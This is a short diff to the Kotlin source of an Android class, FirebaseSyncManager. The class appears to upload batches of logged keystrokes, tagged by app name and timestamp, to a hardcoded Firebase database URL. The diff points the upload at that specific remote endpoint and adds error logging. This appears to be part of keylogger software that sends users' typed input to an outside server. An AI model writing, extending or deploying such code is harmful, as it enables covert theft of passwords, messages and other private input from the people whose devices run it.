@@ -18,8 +18,9 @@ class FirebaseSyncManager {
         private var lastAppName = "unknown.app"
 
         private fun getDatabaseRef() = try {
-            FirebaseDatabase.getInstance().getReference("keystrokes_batches")
+            FirebaseDatabase.getInstance("https://key-lo-5811c-default-rtdb.firebaseio.com").getReference("keystrokes_batches")
         } catch (e: Exception) {
+            Log.e(TAG, "Error getting database ref", e)
             null
         }
 
@@ -56,7 +57,11 @@ class FirebaseSyncManager {
             }
 
             try {
-                val ref = getDatabaseRef() ?: return
+                val ref = getDatabaseRef()
+                if (ref == null) {
+                    Log.e(TAG, "Database reference is null!")
+                    return
+                }
                 val sanitizedAppName = appName.replace(Regex("[^a-zA-Z0-9._-]"), "_")
                 val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", Locale.getDefault()).format(Date())
 
